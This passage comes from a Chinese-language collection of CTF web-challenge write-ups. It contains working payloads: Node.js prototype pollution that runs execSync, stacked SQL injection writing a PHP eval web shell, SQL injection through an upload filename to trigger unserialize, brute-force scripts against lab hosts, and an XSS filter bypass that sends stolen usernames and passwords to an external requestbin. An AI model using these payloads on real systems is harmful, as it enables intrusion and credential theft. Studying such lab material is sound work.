    if(req.session.user.user!="ADMIN"){res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")} 
    req.session.user.data = clone(req.body);
    res.end("<script>alert('success');history.go(-1);</script>");  
    });
    ```

    需要ADMIN账号才能用到clone()

    于是去看/login路由的源码，主要看注册时对用户名的判断

    ```javascript
    if(safeKeyword(req.body.userid)){
    res.end("<script>alert('forbid word');history.go(-1);</script>") 
   }
    ```

    safeKeyword函数

    ```javascript
    function safeKeyword(keyword) {
        if(keyword.match(/(admin)/is)) {
            return keyword
        }
    }
    ```

    这里是通过正则来过滤掉admin(大小写)，不过有个地方可以注意到`'user':req.body.userid.toUpperCase()`
    这里用`toUpperCase`将user给转为大写了，这种转编码的通常都很容易出问题

    [P神javascript大小写特性](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)

    注册payload: `admın`

    ```javascript
    router.get('/info', function (req, res) {
        res.render('index',data={'user':res.outputFunctionName});
    })
    ```

    可以看到在`/info`下，使用将`outputFunctionName`渲染入`index`中，而`outputFunctionName`是未定义的

    `res.outputFunctionName=undefined;`

    也就是可以通过污染`outputFunctionName`进行SSTI

    于是抓`/action`的包，Content-Type设为`application/json`

    payload:
    ```json
    {"lua":"a","__proto__":{"outputFunctionName":"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')//"},"Submit":""}
    ```
    再访问`/info`就可以下载到flag文件

## SUCTF 2018 MultiSQL(SQL注入 文件操作)

### 考点

- sql读文件
- outfile
- load_file

### 解题

1. 这道题目包含二次注入，堆叠注入。wp多数用的都是堆叠注入注入点在登录后用户信息那个页面，存在get参数`?id=`,这里存在堆叠注入和文件写入

    因为select, union, and, or等关键字被过滤，这里可以采用将命令转换成数字绕过

    **绕过方式1——16进制绕过**

    ```cmd
    mysql> select hex("select '<?php eval($_POST[cmd]);?>' into outfile '/var/www/html/favicon/shell.php';");
    +------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
    | hex("select '<?php eval($_POST[cmd]);?>' into outfile '/var/www/html/favicon/shell.php';")                                                                             |
    +------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
    | 73656C65637420273C3F706870206576616C28245F504F53545B636D645D293B3F3E2720696E746F206F757466696C6520272F7661722F7777772F68746D6C2F66617669636F6E2F7368656C6C2E706870273B |
    +------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
    1 row in set (0.00 sec)
    ```

    payload:

    ```sql
    set @a=0x73656C65637420273C3F706870206576616C28245F504F53545B636D645D293B3F3E2720696E746F206F757466696C6520272F7661722F7777772F68746D6C2F66617669636F6E2F7368656C6C2E706870273B;prepare test from @a;execute test;
    ```

    **绕过方式2——10进制**

    ```python
    s = "select '<?php eval($_POST[_]);?>' into outfile '/var/www/html/favicon/shell.php';"
    l = []
    for i in s:
        l.append(str(ord(i)))
    result = 'char('+','.join(l)+')'
    print(result)
    ```

    payload:

    ```sql
    set @a=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)
    ```

    访问`/favicon/shell.php`

    使用蚁剑的时候老是提示返回数据为空，但是在Firefox中可以用hackbar插件直接post方式执行命令也可以拿到flag

## 安洵杯2019 不是文件上传(文件上传+sql注入)

1. 信息收集

   首页网页源码提示了后台源码在github上，网页上有个版权信息，通过版权信息中的用户名在github上可以找到源码。

    helper.php

    ```php
    <?php
    class helper {
        protected $folder = "pic/";
        protected $ifview = False;
        protected $config = "/flag";
        // The function is not yet perfect, it is not open yet.

        public function upload($input="file")
        {
            $fileinfo = $this->getfile($input);
            $array = array();
            $array["title"] = $fileinfo['title'];
            $array["filename"] = $fileinfo['filename'];
            $array["ext"] = $fileinfo['ext'];
            $array["path"] = $fileinfo['path'];
            $img_ext = getimagesize($_FILES[$input]["tmp_name"]);
            $my_ext = array("width"=>$img_ext[0],"height"=>$img_ext[1]);
            $array["attr"] = serialize($my_ext);
            $id = $this->save($array);
            if ($id == 0){
                die("Something wrong!");
            }
            echo "<br>";
            echo "<p>Your images is uploaded successfully. And your image's id is $id.</p>";
        }

        public function getfile($input)
        {
            if(isset($input)){
                $rs = $this->check($_FILES[$input]);
            }
            return $rs;
        }

        public function check($info)
        {
            $basename = substr(md5(time().uniqid()),9,16);
            $filename = $info["name"];
            $ext = substr(strrchr($filename, '.'), 1);
            $cate_exts = array("jpg","gif","png","jpeg");
            if(!in_array($ext,$cate_exts)){
                die("<p>Please upload the correct image file!!!</p>");
            }
            $title = str_replace(".".$ext,'',$filename);
            return array('title'=>$title,'filename'=>$basename.".".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.".".$ext);
        }

        public function save($data)
        {
            if(!$data || !is_array($data)){
                die("Something wrong!");
            }
            $id = $this->insert_array($data);
            return $id;
        }

        public function insert_array($data)
        {
            $con = mysqli_connect("127.0.0.1","r00t","r00t","pic_base");
            if (mysqli_connect_errno($con))
            {
                die("Connect MySQL Fail:".mysqli_connect_error());
            }
            $sql_fields = array();
            $sql_val = array();
            foreach($data as $key=>$value){
                $key_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $key);
                $value_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $value);
                $sql_fields[] = "`".$key_temp."`";
                $sql_val[] = "'".$value_temp."'";
            }
            $sql = "INSERT INTO images (".(implode(",",$sql_fields)).") VALUES(".(implode(",",$sql_val)).")";
            mysqli_query($con, $sql);
            $id = mysqli_insert_id($con);
            mysqli_close($con);
            return $id;
        }

        public function view_files($path){
            if ($this->ifview == False){
                return False;
                //The function is not yet perfect, it is not open yet.
            }
            $content = file_get_contents($path);
            echo $content;
        }

        function __destruct(){
            # Read some config html
            $this->view_files($this->config);
        }
    }
    ?>
    ```

    show.php
    ```php
    <?php
    include("./helper.php");
    $show = new show();
    if($_GET["delete_all"]){
        if($_GET["delete_all"] == "true"){
            $show->Delete_All_Images();
        }
    }
    $show->Get_All_Images();

    class show{
        public $con;

        public function __construct(){
            $this->con = mysqli_connect("127.0.0.1","r00t","r00t","pic_base");
            if (mysqli_connect_errno($this->con)){
                die("Connect MySQL Fail:".mysqli_connect_error());
            }
        }

        public function Get_All_Images(){
            $sql = "SELECT * FROM images";
            $result = mysqli_query($this->con, $sql);
            if ($result->num_rows > 0){
                while($row = $result->fetch_assoc()){
                    if($row["attr"]){
                        $attr_temp = str_replace('\0\0\0', chr(0).'*'.chr(0), $row["attr"]);
                        $attr = unserialize($attr_temp);
                    }
                    echo "<p>id=".$row["id"]." filename=".$row["filename"]." path=".$row["path"]."</p>";
                }
            }else{
                echo "<p>You have not uploaded an image yet.</p>";
            }
            mysqli_close($this->con);
        }

        public function Delete_All_Images(){
            $sql = "DELETE FROM images";
            $result = mysqli_query($this->con, $sql);
        }
    }
    ```

2. 解题过程

    通过分析 `helper.php` 会发现两个很明显的函数，

    ```php
    public function view_files($path){
        if ($this->ifview == False){
            return False;
            //The function is not yet perfect, it is not open yet.
        }
        $content = file_get_contents($path);
        echo $content;
    }

    function __destruct(){
        # Read some config html
        $this->view_files($this->config);
    }
    ```
    `__destruct` 函数会调用 `view_files`函数，然后 `view_files` 函数会读取文件内容并显示出来。`__destruct`是魔术方法，对象销毁时会自动调用。

    `__destruct` 传给 `view_files`函数的参数是对象自身属性`$htis->config`,所以我们可以向办法让属性config的值为`/flag`。从而达到读取flag的目的(*flag的文件的名称和路径是猜的，flag的路径一般就两个，当前目录下，或者根目录，名称没有提示就是flag*)

    这样的话就要利用反序列化，show类中有个反序列化`$attr = unserialize($attr_temp);`,helper类中有个序列化`$array["attr"] = serialize($my_ext);`,下一步就是想办法把这个attr的值改成我们构造的payload,那么问题来了，这个参数的值我们没有办法直接修改。

    接着往下看，调用了`save()`
    ```php
    public function save($data)
    {
        if(!$data || !is_array($data)){
            die("Something wrong!");
        }
        $id = $this->insert_array($data);
        return $id;
    }
    ```
    `save()`首先判断传过来的参数是否为存在，且是否为数组，然后会调用`insert_array()`
    ```php
    public function insert_array($data)
    {
        $con = mysqli_connect("127.0.0.1","r00t","r00t","pic_base");
        if (mysqli_connect_errno($con))
        {
            die("Connect MySQL Fail:".mysqli_connect_error());
        }
        $sql_fields = array();
        $sql_val = array();
        foreach($data as $key=>$value){
            $key_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $key);
            $value_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $value);
            $sql_fields[] = "`".$key_temp."`";
            $sql_val[] = "'".$value_temp."'";
        }
        $sql = "INSERT INTO images (".(implode(",",$sql_fields)).") VALUES(".(implode(",",$sql_val)).")";
        mysqli_query($con, $sql);
        $id = mysqli_insert_id($con);
        mysqli_close($con);
        return $id;
    }
    ```

    这个函数的作用就是把数据存入数据库，但是在存之前，它会做一些处理。因为`helper`类中的属性是 `protected` 类型的,在序列化后会在属性名前添加`\0\0\0`(*'\0'表示空字符，ASCII值为0*), `insert_array`会把`\0\0\0`替换成 `chr(0).'*'.chr(0)`,然后它会把数组中的键值分别存入两个数组，一个存放键，一个存放值。最后一步处理是用`implode`函数将数组中的元素用`,`连接成字符串。处理完之后存入数组，没有做任何过滤。

    payload1
    ```php
    <?php
    class helper{
        protected $ifview = true;
        protected $config = "/flag";
    }

    $a = new helper();
    echo serialize($a);
    echo '<br>';
    echo bin2hex(serialize($a));
    ```
    对于上面的替换可以采用16进制绕过，mysql数据库会自动将16进制转换成字符串。

    payload1
    ```
    0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d
    ```

    我们可以构造一个payload，让后台执行以后sql语句变成 
    ```sql
    INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES ('x','x','x','x',payload1);#
    ```

    因为它利用了implode分割，我们正好可以利用这个函数。那么问题来了，我们要找到我们可以控制的参数。

    在给数组赋值前调用了`getfile`函数
    ```php
    public function getfile($input)
    {
        if(isset($input)){
            $rs = $this->check($_FILES[$input]);
        }
        return $rs;
    }
    ```
    先检查input是否为空，然后调用`check`函数。

    ```php
    public function check($info)
    {
        $basename = substr(md5(time().uniqid()),9,16);
        $filename = $info["name"];
        $ext = substr(strrchr($filename, '.'), 1);
        $cate_exts = array("jpg","gif","png","jpeg");
        if(!in_array($ext,$cate_exts)){
            die("<p>Please upload the correct image file!!!</p>");
        }
        $title = str_replace(".".$ext,'',$filename);
        return array('title'=>$title,'filename'=>$basename.".".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.".".$ext);
    }
    ```
    这个函数最后返回数组，观察里面的值，`'title'=>$title`,`$title`变量的值是`$filename`的值去掉后缀名得到的。filename就是我们上传文件的文件名。这个字段我们可以控制。再看其他参数，我们都没办法控制。所以我们就要通过控制文件名来传入我们的payload，然后利用反序列化读取文件。

    payload2
    ```php
    filename=a','1','1','1',payload1);#.jpg
    ```
    implod分割数组元素是会加一对`''`,第一个参数需要闭合一下第一个 `'`,后面的因为我们用了`#`注释后面的内容，所以要在payload1后加一个`);`

    因为后台会验证后缀名，所以也要加一下。

    bp抓取上传文件的数据包，修改文件名为payload2，访问show.php就能拿到flag。

## SUCTF 2018 annonymous(php匿名函数\x00lambda_)

1. 源码

    ```php
     <?php
    $MY = create_function("","die(`cat flag.php`);");
    $hash = bin2hex(openssl_random_pseudo_bytes(32));
    eval("function SUCTF_$hash(){"
        ."global \$MY;"
        ."\$MY();"
        ."}");
    if(isset($_GET['func_name'])){
        $_GET["func_name"]();
        die();
    }
    show_source(__FILE__); 
    ```

2. 解题

    一开始思路偏了，去网上找`openssl_random_pseudo_bytes(32)`函数漏洞，看到有说这个函数生成的随机数可以被暴力猜解，但是找了很久没发现。

    去看了wp才知道本题的漏洞在`create_function`函数上。

    create_function()函数在创建之后会生成一个函数名为：`%00lambda_num`

    num是持续递增的，这里的num会一直递增到最大长度直到结束,通过大量的请求来迫使Pre-fork模式启动Apache启动新的线程，这样这里的%d会刷新为1，就可以预测了

    爆破脚本(没有成功，没跑出来)

    ```python
    import requests
    while True:
        r=requests.get('http://5447d59a-c7c3-4466-8ed7-758815e319f5.node5.buuoj.cn:81/?func_name=%00lambda_1')
        if 'flag' in r.text:
            print(r.text)
            break
        print('Testing.......')
    ```
    官方脚本(python2，也没成功。。。)
    ```python
    # coding: UTF-8
    # Author: orange@chroot.org
    # using python2

    import requests
    import socket
    import time
    from multiprocessing.dummy import Pool as ThreadPool
    try:
        requests.packages.urllib3.disable_warnings()
    except:
        pass

    def run(i):
        while 1:
            HOST = '28ae7c60-92ae-447c-a9c9-b50024d45b25.node3.buuoj.cn'
            PORT = 80
            se = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            se.connect((HOST, PORT))
            se.send("GET / HTTP/1.1\r\n")
            se.send("Host: 28ae7c60-92ae-447c-a9c9-b50024d45b25.node3.buuoj.cn\r\n")
            se.send("Connection: keep-alive\r\n\r\n")
            # s.close()
            print 'ok'
            time.sleep(0.5)

    i = 8
    pool = ThreadPool( i )
    result = pool.map_async( run, range(i) ).get(0xffff)
    ```
    也可以用bp的intruder模块爆破，不过不知道为什么，这道题我爆破了好几次，最后一次才把flag跑出来。可能环境有问题。

## RoarCTF 2019 Online Proxy(二次注入+盲注)

进入环境后从源码中发现IP信息，通过XFF可以修改IP，页面会显示当前IP和上一个IP

>第一次输入1'or'1'='1的时候会直接显示出来
>
>第二次输入2，因为和第一次输入不同，于是第一次输入存入到数据库中，并显示在Last ip中
>
>第三次输入2，因为和第二次输入相同，相当于模拟的ip不再变化，因此这个时候会在数据库中查找ip2的last ip，执行了查询操作，因此这个地方是我们的利用点了

然后就是普通的盲注了。

## GWCTF2019 mypassword(XSS)

- 首页登录界面，查看源码发现注册页面，注册账号登录，发现留言界面`feedback.php`,留言列表`list.php`
- 在登录注册页面fuzz了一下，发现过滤了所有特殊字符，而且登录后首页提示密码在源码里面，不存在注入，所以排除了SQL注入
- 在feedback发现了注释的源码

    ```php
    if(is_array($feedback)){
				echo "<script>alert('反馈不合法');</script>";
				return false;
			}
			$blacklist = ['_','\'','&','\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];
			foreach ($blacklist as $val) {
		        while(true){
		            if(stripos($feedback,$val) !== false){
		                $feedback = str_ireplace($val,"",$feedback);
		            }else{
		                break;
		            }
		        }
		    }
    ```

    根据源码黑名单中的内容可以看出过滤的都是js的关键字，所以从这里可以判断出这道题目考点是XSS。而且这里的过滤采用的是非递归的替换过滤，直接可以采用双写绕过

- 看网页源码的时候发现了一个js的文件

    ```js
    if (document.cookie && document.cookie != '') {
        var cookies = document.cookie.split('; ');
        var cookie = {};
        for (var i = 0; i < cookies.length; i++) {
            var arr = cookies[i].split('=');
            var key = arr[0];
            cookie[key] = arr[1];
        }
        if(typeof(cookie['user']) != "undefined" && typeof(cookie['psw']) != "undefined"){
            document.getElementsByName("username")[0].value = cookie['user'];
            document.getElementsByName("password")[0].value = cookie['psw'];
        }
    }
    ```

    可以发现用户名密码都存入cookie中

- 构造payload把账号密码发送到XSS平台

    ```xml
    <inpcookieut type="text" name="username"></inpcookieut>
    <inpcookieut type="text" name="password"></inpcookieut>
    <scricookiept scookierc="./js/login.js"></scricookiept>
    <scricookiept>
        var uname = documcookieent.getElemcookieentsByName("username")[0].value;
        var passwd = documcookieent.getElemcookieentsByName("password")[0].value;
        var res = uname + " " + passwd;
        documcookieent.locacookietion="http://http.requestbin.buuoj.cn/*/?a="+res;
    </scricookiept>
    <!-- 其中的url地址要填XSS平台中构造的地址 -->
    ```

    稍微等待一会就会得到密码，密码就是flag。